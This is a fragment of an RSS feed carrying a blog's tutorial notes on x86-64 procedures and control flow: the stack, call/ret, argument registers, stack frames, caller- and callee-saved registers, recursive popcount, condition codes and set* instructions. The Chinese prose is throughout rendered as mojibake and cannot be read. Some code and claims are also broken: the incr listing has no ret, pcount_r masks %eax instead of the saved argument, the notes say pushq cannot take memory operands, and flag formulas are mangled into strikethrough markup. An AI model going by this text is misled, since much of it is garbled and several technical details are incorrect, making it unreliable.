å› æ­¤ä¸ºäº†è¿”å›åˆ°æ­£ç¡®çš„ä½ç½®,æˆ‘ä»¬éœ€è¦è®°å½•è¿”å›ä½ç½®çš„ä¿¡æ¯.&lt;/li&gt;
&lt;li&gt;ä¼ é€’å‚æ•°
Qæ˜¯ä¸€ä¸ªå‡½æ•°,å®ƒèƒ½å¤Ÿæ¥æ”¶å‚æ•°å¹¶èƒ½åœ¨å‡½æ•°å†…éƒ¨ä½¿ç”¨è¿™ä¸ªå‚æ•°.
å½“Pè°ƒç”¨Qçš„æ—¶å€™,Pç»™Qä¼ é€’äº†ä¸€ä¸ªå…·ä½“å€¼.
å½“Qè¿”å›å€¼æ—¶,Pä¹Ÿèƒ½å¤Ÿä½¿ç”¨è¿”å›å€¼.&lt;/li&gt;
&lt;li&gt;å†…å­˜ç®¡ç†
è¿‡ç¨‹æ‰§è¡Œæ—¶åˆ†é…å†…å­˜,è¿”å›æ—¶é‡Šæ”¾å†…å­˜.&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;æ ˆçš„ç»“æ„&lt;/h1&gt;
&lt;p&gt;æ ˆä¸æ˜¯å•ç‹¬çš„ç¡¬ä»¶,è€Œæ˜¯å†…å­˜çš„æŸä¸€éƒ¨åˆ†.ç¨‹åºä½¿ç”¨æ ˆæ¥ç®¡ç†è¿‡ç¨‹è°ƒç”¨ä¸è¿”å›çš„çŠ¶æ€.
å½“è°ƒç”¨æ—¶,éœ€è¦ä¸€äº›ä¿¡æ¯;å½“ä»è°ƒç”¨ä¸­è¿”å›æ—¶,æ‰€æœ‰çš„ä¿¡æ¯å¯ä»¥è¢«ä¸¢å¼ƒ,ç¬¦åˆæ ˆçš„åè¿›å…ˆå‡ºçš„è§„åˆ™.
åœ¨x86æ ˆä¸­,æ ˆå¼€å§‹çš„åœ°å€å®é™…ä¸Šæ˜¯ä¸€ä¸ªéå¸¸é«˜çš„åœ°å€,å½“æ ˆå¢é•¿æ—¶,é€šè¿‡å‡å°æ ˆæŒ‡é’ˆ%rspæ¥å®ç°.%rspçš„å€¼æ˜¯å½“å‰æ ˆé¡¶çš„åœ°å€,æ¯æ¬¡åˆ†é…æ›´å¤šæ ˆçš„ç©ºé—´æ—¶,éƒ½ä¼šé€’å‡è¯¥æŒ‡é’ˆ.&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Stack&lt;/th&gt;
&lt;th&gt;Address&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;Bottom&lt;/td&gt;
&lt;td&gt;high address&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;â†“ stack growing down&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;%rsp:Top&lt;/td&gt;
&lt;td&gt;low address&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;æ±‡ç¼–å½“ä¸­æœ‰ &lt;code&gt;push&lt;/code&gt; å’Œ &lt;code&gt;pop&lt;/code&gt; ä¸¤ä¸ªæŒ‡ä»¤æ¥å¯¹æ ˆè¿›è¡Œæ“ä½œ.&lt;/p&gt;
&lt;h2&gt;pushå…¥æ ˆ&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;	pushq    src 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ“ä½œæ•°srcå…¥æ ˆ,æ­¤æ“ä½œæ•°å¯ä»¥æ¥è‡ªå¯„å­˜å™¨,å†…å­˜æˆ–ç«‹å³æ•°:
é¦–å…ˆ%rspå‡å°8,ç„¶åæŠŠæ“ä½œæ•°å¤åˆ¶åˆ°%rspæŒ‡å‘çš„å†…å­˜å¤„.
ä¸èƒ½æŠŠå†…å­˜ä¸­çš„æ•°æ®ç›´æ¥æ”¾å…¥åˆ°æ ˆä¸­,æ‰€ä»¥srcæ˜¯ä¸€ä¸ªå¯„å­˜å™¨æˆ–è€…ç«‹å³æ•°.&lt;/p&gt;
&lt;h2&gt;popå‡ºæ ˆ&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;	popq     dst
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;é¦–å…ˆæŠŠ%rspåœ°å€æŒ‡å‘çš„å†…å­˜çš„å€¼ä¿å­˜åˆ°dstå¯„å­˜å™¨ä¸­,ç„¶å%rspå¢åŠ 8.
dståªèƒ½æ˜¯å¯„å­˜å™¨.&lt;/p&gt;
&lt;h1&gt;ä¼ é€’æ§åˆ¶&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;æ³¨æ„call, retå¹¶ä¸æ˜¯å®Œæˆäº†è°ƒç”¨å‡½æ•°çš„å…¨éƒ¨å·¥ä½œ,åªæ˜¯æ§åˆ¶éƒ¨åˆ†
ä½¿ç”¨æ ˆæ¥æ”¯æŒcallå’ŒretæŒ‡ä»¤&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;call&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;	call    label
&lt;/code&gt;&lt;/pre&gt;
&lt;ol&gt;
&lt;li&gt;è¿”å›åœ°å€å…¥æ ˆ&lt;/li&gt;
&lt;li&gt;è·³è½¬åˆ°label&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;è¿”å›åœ°å€&lt;/h2&gt;
&lt;p&gt;è¿”å›åœ°å€æ˜¯callçš„ä¸‹ä¸€æ¡æŒ‡ä»¤&lt;/p&gt;
&lt;h2&gt;ret&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;è¿”å›åœ°å€å‡ºæ ˆ&lt;/li&gt;
&lt;li&gt;è·³è½¬åˆ°è¿”å›åœ°å€&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;ä¸¾ä¾‹&lt;/h2&gt;
&lt;p&gt;å¯¹äº&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;400540 &amp;lt;multstore&amp;gt;:
	...
	400544: callq    400550 &amp;lt;mult2&amp;gt;
	400549: mov      %rax, (%rbx)
	...

400550 &amp;lt;mult2&amp;gt;:
	400550: mov     %rdi, %rax
	...
	400557: ret
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;é¦–å…ˆå½“ç¨‹åºè®¡æ•°å™¨%ripæ‰§è¡Œåˆ°0x400544çš„æ—¶å€™,%rspå‡å»8,0x400549å…¥æ ˆ,%ripä¿®æ”¹ä¸ºè°ƒç”¨çš„å‡½æ•°çš„åœ°å€;è°ƒç”¨çš„å‡½æ•°è¿”å›å,0x400549å‡ºæ ˆ,%rspå¢åŠ 8,%ripä¿®æ”¹ä¸º0x400549,ä¹Ÿå°±æ˜¯æ‰§è¡Œcallçš„ä¸‹ä¸€æ¡æŒ‡ä»¤.
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250121180538.png&quot; alt=&quot;&quot;&gt;
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250121180559.png&quot; alt=&quot;&quot;&gt;
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250121180618.png&quot; alt=&quot;&quot;&gt;
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250121180635.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;ä¸åƒ &lt;code&gt;push&lt;/code&gt; å’Œ &lt;code&gt;pop&lt;/code&gt;æŒ‡ä»¤èƒ½å¤Ÿç”¨movå®ç°,ç”±äºæ²¡æœ‰æŒ‡ä»¤èƒ½å¤Ÿä¹‹é—´æ“ä½œ%rip,æ‰€ä»¥ &lt;code&gt;call&lt;/code&gt; å’Œ &lt;code&gt;ret&lt;/code&gt; ä¸èƒ½ç”¨å…¶ä»–æŒ‡ä»¤å®ç°.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;ä¼ é€’å‚æ•°&lt;/h1&gt;
&lt;p&gt;å¤´6ä¸ªå‚æ•°(å¦‚æœæœ‰)ä¾æ¬¡å­˜æ”¾åœ¨è¿™6ä¸ªå¯„å­˜å™¨ä¸­:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;å‚æ•°&lt;/th&gt;
&lt;th&gt;å¯„å­˜å™¨&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;ç¬¬1ä¸ª&lt;/td&gt;
&lt;td&gt;%rdi&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ç¬¬2ä¸ª&lt;/td&gt;
&lt;td&gt;%rsi&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ç¬¬3ä¸ª&lt;/td&gt;
&lt;td&gt;%rdx&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ç¬¬4ä¸ª&lt;/td&gt;
&lt;td&gt;%rcx&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ç¬¬5ä¸ª&lt;/td&gt;
&lt;td&gt;%r8&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ç¬¬6ä¸ª&lt;/td&gt;
&lt;td&gt;%r9&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;å¦‚æœå‚æ•°çš„ä¸ªæ•°å¤šäº6ä¸ª,å‰©ä¸‹çš„å‚æ•°ä¼šå­˜æ”¾åœ¨æ ˆä¸Š.&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;å‡½æ•°è¿”å›å€¼ä¸º%rax&lt;/p&gt;
&lt;h1&gt;ç®¡ç†å±€éƒ¨æ•°æ®&lt;/h1&gt;
&lt;h2&gt;é¢å‘å †æ ˆçš„è¯­è¨€&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;æ”¯æŒé€’å½’çš„è¯­è¨€:ä¾‹å¦‚C,Javaç­‰ç­‰å¤§å¤šæ•°è¯­è¨€&lt;ul&gt;
&lt;li&gt;&amp;quot;å¯é‡å…¥&amp;quot;çš„å‡½æ•°:åœ¨ä»»ä½•ç»™å®šçš„æ—¶é—´åªæœ‰ä¸€ä¸ªå‡½æ•°åœ¨è¿è¡Œ&lt;/li&gt;
&lt;li&gt;éœ€è¦ä¸€äº›ç©ºé—´æ¥å­˜å‚¨æ¯ä¸ªå®ä¾‹çš„çŠ¶æ€:å‚æ•°,å±€éƒ¨å˜é‡,è¿”å›æŒ‡é’ˆ
æˆ‘ä»¬æŠŠæ ˆä¸Šç”¨äºç‰¹å®šè°ƒç”¨çš„æ¯ä¸ªå†…å­˜å—ç§°ä¸º&lt;strong&gt;æ ˆå¸§&lt;/strong&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;æ ˆå¸§&lt;/h2&gt;
&lt;p&gt;åœ¨æ ˆä¸Šä¸ºæ¯ä¸ªè¢«è°ƒç”¨ä¸”æœªè¿”å›çš„è¿‡ç¨‹ä¿ç•™ä¸€ä¸ªæ ˆå¸§.
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250121215045.png&quot; alt=&quot;&quot;&gt;
é€šå¸¸ä¸€ä¸ªæ ˆå¸§ç”±ä¸¤ä¸ªæŒ‡é’ˆåˆ†å‰²,ä¸€ä¸ªæ˜¯æ ˆé¡¶æŒ‡é’ˆ%rsp,å¦ä¸€ä¸ªæ˜¯åŸºåº•æŒ‡é’ˆ&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;æ ˆå¸§çš„å†…å®¹&lt;ul&gt;
&lt;li&gt;è¿”å›ä¿¡æ¯&lt;/li&gt;
&lt;li&gt;å±€éƒ¨å­˜å‚¨&lt;/li&gt;
&lt;li&gt;ä¸´æ—¶ç©ºé—´&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250121221021.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;è°ƒç”¨è€…çš„æ ˆå¸§
å¦‚æœéœ€è¦ä¼ é€’6ä¸ªä»¥ä¸Šçš„å‚æ•°,è°ƒç”¨è€…å®é™…ä¸Šå°†ä½¿ç”¨è‡ªå·±çš„æ ˆå¸§æ¥å­˜å‚¨è¿™äº›å‚æ•°
è¿”å›åœ°å€å…¥æ ˆ&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;å½“å‰æ ˆå¸§
å¦‚æœä½¿ç”¨%rbp,è¿˜éœ€è¦å­˜å‚¨ä¹‹å‰çš„%rbp
å‚æ•°,å±€éƒ¨å˜é‡...&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;ä¸¾ä¾‹&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* incr */
long incr(long *p,long val){
	long x = *p;
	long y = x + val;
	*p = y;
	return x;
}// ä»¥valå¢åŠ pæŒ‡å‘çš„æ•´æ•°
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;incrçš„æ±‡ç¼–ä»£ç &lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;incr:
	movq    (%rdi), %rax
	addq    %rax, %rsi
	movq    %rsi, (%rdi)
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* call_incr */
long call_incr(){
	long v1 = 12345;
	long v2 = incr(&amp;amp;v1, 1)
	return v1 + v2;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;call_incrçš„æ±‡ç¼–ä»£ç &lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;call_incr:
	subq    $16, %rsp
	movq    $12345, 8(%rsp)
	movl    $1, %esi           # ç¬¬äºŒä¸ªå‚æ•°1
	leaq    8(%rsp), %rdi      # ç¬¬ä¸€ä¸ªå‚æ•°*8(%rsp)
	call    incr
	addq    8(%rsp), %rax
	addq    $16, %rsp
	ret
&lt;/code&gt;&lt;/pre&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;æ ˆçš„å†…å®¹&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;...&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;...&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ret address&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;12345          â†%rsp+8&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;unuse          â†%rsp&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;ç¼–è¯‘å™¨åˆ†é…æ ˆå¸§ç©ºé—´æ—¶ä¼šé¢„ç•™ä¸€äº›ä¸ä¸€å®šä¼šä½¿ç”¨çš„ç©ºé—´&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;å¯„å­˜å™¨ä¿å­˜çº¦å®š&lt;/h2&gt;
&lt;p&gt;å¯„å­˜å™¨çš„æ•°é‡æ˜¯æœ‰é™çš„,ä¸åŒå‡½æ•°å¯¹å¯„å­˜å™¨é‡å¤è¿›è¡Œæ“ä½œå¯èƒ½ä¼šå¯¼è‡´å†²çª,æ‰€ä»¥æœ‰äº›å¯„å­˜å™¨çš„å€¼ä¸å¾—ä¸å…ˆä¿å­˜åˆ°å†…å­˜å½“ä¸­,å¹¶éµå¾ªä¸€å®šè§„åˆ™çº¦å®š.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;è°ƒç”¨è€…ä¿å­˜(caller saved)
è°ƒç”¨è€…åœ¨è°ƒç”¨å‰æŠŠä¸´æ—¶æ•°æ®ä¿å­˜åœ¨å®ƒçš„æ ˆå¸§ä¸­.
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250122003159.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;è¢«è°ƒç”¨è€…ä¿å­˜(callee saved)
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250122003225.png&quot; alt=&quot;&quot;&gt;
è¢«è°ƒç”¨è€…åœ¨ä½¿ç”¨å¯„å­˜å™¨å‰æŠŠå¯„å­˜å™¨çš„æ•°æ®ä¿å­˜åœ¨å®ƒçš„æ ˆå¸§ä¸­.è¿”å›æ—¶é‡æ–°å­˜å–.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1&gt;é˜è¿°é€’å½’&lt;/h1&gt;
&lt;p&gt;ä½¿ç”¨é€’å½’è®¡æ•°unsigned int çš„1ä½çš„ä¸ªæ•°&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* Recursive popcount */
long pcount_r(unsigned long x){
	if(x==0)
		return 0;
	else 
		return (x &amp;amp; 1) + pcount_r(x&amp;gt;&amp;gt;1);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ±‡ç¼–ä»£ç &lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;pcount_r:
	movl    $0, %eax
	testq   %rdi, %rdi
	je      .L6
	pushq   %rbx
	movq    %rdi, %rbx       # xå…ˆå­˜å‚¨åˆ°%rbx
	andl    $1, %eax      
	shrq    %rdi             # x&amp;gt;&amp;gt;=1,ä¼ ç»™é€’å½’å‡½æ•°
	call    pcount_r
	addq    %rbx, %rax       # %raxæ˜¯é€’å½’è¿”å›ç»“æœ
	popq    %rbx             # xæ¢å¤åˆ°ä¹‹å‰çš„å€¼
.L6:
	rep; ret
&lt;/code&gt;&lt;/pre&gt;
</content:encoded><dc:creator>Dalekov</dc:creator><pubDate>Sat, 18 Jan 2025 16:00:00 GMT</pubDate></item><item><title>æœºå™¨çº§ç¼–ç¨‹II(æ§åˆ¶)</title><link>https://www.tankimzeg.top/blog/%E6%9C%BA%E5%99%A8%E7%BA%A7%E7%BC%96%E7%A8%8Bii%E6%8E%A7%E5%88%B6control/</link><guid isPermaLink="true">https://www.tankimzeg.top/blog/%E6%9C%BA%E5%99%A8%E7%BA%A7%E7%BC%96%E7%A8%8Bii%E6%8E%A7%E5%88%B6control/</guid><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://www.tankimzeg.top/blog/%E6%9C%BA%E5%99%A8%E7%BA%A7%E7%BC%96%E7%A8%8Bii%E6%8E%A7%E5%88%B6control/&quot;&gt;https://www.tankimzeg.top/blog/%E6%9C%BA%E5%99%A8%E7%BA%A7%E7%BC%96%E7%A8%8Bii%E6%8E%A7%E5%88%B6control/&lt;/a&gt;&lt;/blockquote&gt; &lt;h1&gt;å¤„ç†å™¨çŠ¶æ€(éƒ¨åˆ†)&lt;/h1&gt;
&lt;p&gt;å½“å‰æ‰§è¡Œç¨‹åºçš„ä¿¡æ¯&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ä¸´æ—¶æ•°æ®:%rax,%rbx...&lt;/li&gt;
&lt;li&gt;å½“å‰æ ˆé¡¶:%rsp&lt;/li&gt;
&lt;li&gt;æŒ‡ä»¤æŒ‡é’ˆ:%ripå½“å‰æ­£åœ¨æ‰§è¡Œçš„æŒ‡ä»¤çš„åœ°å€&lt;/li&gt;
&lt;li&gt;æ¡ä»¶ç (å…±8ä¸ª)&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;æ¡ä»¶ç &lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;1bitçš„å¯„å­˜å™¨&lt;ul&gt;
&lt;li&gt;CF(Carry Flag):è¿›ä½æ ‡å¿—(for unsigned)&lt;/li&gt;
&lt;li&gt;ZF(Zero Flag):é›¶æ ‡å¿—,è¿ç®—çš„ç»“æœæ˜¯0å°±ä¼šè¢«è®¾ç½®&lt;/li&gt;
&lt;li&gt;SF(Sign Flag):ç¬¦å·æ ‡å¿—(for signed),å¦‚æœè¿ç®—çš„ç»“æœæœ€é«˜ä½æ˜¯1(è¯´æ˜ç»“æœæ˜¯è´Ÿæ•°)å°±ä¼šè¢«è®¾ç½®ä¸º1&lt;/li&gt;
&lt;li&gt;OF(Overflow Flag):æº¢å‡ºæ ‡å¿—(for signed),å¦‚è¿ç®—ç»“æœæº¢å‡ºå°±ä¼šè¢«è®¾ç½®ä¸º1&lt;/li&gt;
&lt;li&gt;leaæŒ‡ä»¤ä¸ä¼šè®¾ç½®è¿™äº›æ¡ä»¶ç &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;éšå¼è®¾ç½®&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;addq src,dst&lt;/code&gt; &amp;lt;-&amp;gt; &lt;code&gt;t = a + b;&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;å½“unsignedæº¢å‡ºæ—¶è®¾ç½®CF&lt;/li&gt;
&lt;li&gt;å½“&lt;code&gt;t == 0&lt;/code&gt;æ—¶è®¾ç½®ZF&lt;/li&gt;
&lt;li&gt;å½“&lt;code&gt;t &amp;lt; 0&lt;/code&gt;æ—¶è®¾ç½®SF&lt;/li&gt;
&lt;li&gt;å½“signedæº¢å‡ºæ—¶è®¾ç½®OF    &lt;code&gt;(a&amp;gt;0 &amp;amp;&amp;amp; b&amp;gt;0 &amp;amp;&amp;amp; t&amp;lt;0) || (a&amp;lt;0 &amp;amp;&amp;amp; b&amp;lt;0 &amp;amp;&amp;amp; t&amp;gt;=0)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;æ˜¾å¼è®¾ç½®&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;cmpq b, a&lt;/code&gt;:è®¡ç®—a-b&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;å½“unsignedæº¢å‡ºæ—¶è®¾ç½®CF&lt;/li&gt;
&lt;li&gt;å½“&lt;code&gt;a == b&lt;/code&gt;æ—¶è®¾ç½®ZF&lt;/li&gt;
&lt;li&gt;å½“&lt;code&gt;(a-b) &amp;lt; 0&lt;/code&gt;æ—¶è®¾ç½®SF&lt;/li&gt;
&lt;li&gt;å½“signedæº¢å‡ºæ—¶è®¾ç½®OF     &lt;code&gt;(a&amp;gt;0 &amp;amp;&amp;amp; b&amp;lt;0 &amp;amp;&amp;amp; (a-b)&amp;lt;0) || (a&amp;lt;0 &amp;amp;&amp;amp; b&amp;gt;0 &amp;amp;&amp;amp; (a-b)&amp;gt;0)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;&lt;code&gt;test b, a&lt;/code&gt; : è®¡ç®—a&amp;amp;b&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;å½“&lt;code&gt;a &amp;amp; b == 0&lt;/code&gt;æ—¶è®¾ç½®ZF&lt;/li&gt;
&lt;li&gt;å½“&lt;code&gt;a &amp;amp; b &amp;lt; 0&lt;/code&gt;æ—¶è®¾ç½®SF
æœ‰ä¸€ä¸ªæ“ä½œæ•°æ˜¯æ©ç çš„æ—¶å€™å°±å¯ä»¥ç›´æ¥å¾—å‡ºå¦ä¸€ä¸ªæ“ä½œæ•°æ˜¯æ•´æ•°è¿˜æ˜¯è´Ÿæ•°.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;è¯»å–æ¡ä»¶ç &lt;/h2&gt;
&lt;p&gt;&lt;code&gt;set* dst&lt;/code&gt;æŒ‡ä»¤:åŸºäºæ¡ä»¶ç ,è®¾ç½®dstçš„æœ€ä½ä¸€ä½ä¸º0æˆ–1&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;left&quot;&gt;set*&lt;/th&gt;
&lt;th align=&quot;left&quot;&gt;æ¡ä»¶&lt;/th&gt;
&lt;th align=&quot;left&quot;&gt;å«ä¹‰&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&quot;left&quot;&gt;&lt;code&gt;sete&lt;/code&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;ZF&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;equal/zero&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;left&quot;&gt;&lt;code&gt;setne&lt;/code&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;~ZF&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;not equal/not zero&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;left&quot;&gt;&lt;code&gt;sets&lt;/code&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;SF&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;negative&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;left&quot;&gt;&lt;code&gt;setns&lt;/code&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;~SF&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;nonnegative&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;left&quot;&gt;&lt;code&gt;setg&lt;/code&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;&lt;del&gt;(SF^OF)&amp;amp;&lt;/del&gt;ZF&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;greater(signed)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;left&quot;&gt;&lt;code&gt;setge&lt;/code&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;~(SF^OF)&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;greater or equal(signed)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;left&quot;&gt;&lt;code&gt;setl&lt;/code&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;(SF^OF)&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;less(signed)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;left&quot;&gt;&lt;code&gt;setle&lt;/code&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;(SF^OF)&amp;amp;#124ZF&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;less or equal(signed)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;left&quot;&gt;&lt;code&gt;seta&lt;/code&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;&lt;del&gt;CF&amp;amp;&lt;/del&gt;ZF&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;above(unsigned)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;left&quot;&gt;&lt;code&gt;setb&lt;/code&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;CF&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;below(unsigned)&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;åœ¨x86-64æ•´æ•°å¯„å­˜å™¨ä¸­,èƒ½å¤Ÿä½¿ç”¨æœ€ä½ä¸€å­—èŠ‚æ¥å­˜æ”¾ä»¥ä¸Šç»“æœ
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250118232534.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ä¸¾ä¾‹&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;int gt(long x,long y){
	return x &amp;gt; y;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¯¹åº”çš„æ±‡ç¼–ä»£ç :&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;gt:
	cmpq   %rsi, %rdi    # æ¯”è¾ƒ%rdi-%rsi
	setg   %al           # å½“ &amp;gt; æ—¶è®¾ç½®
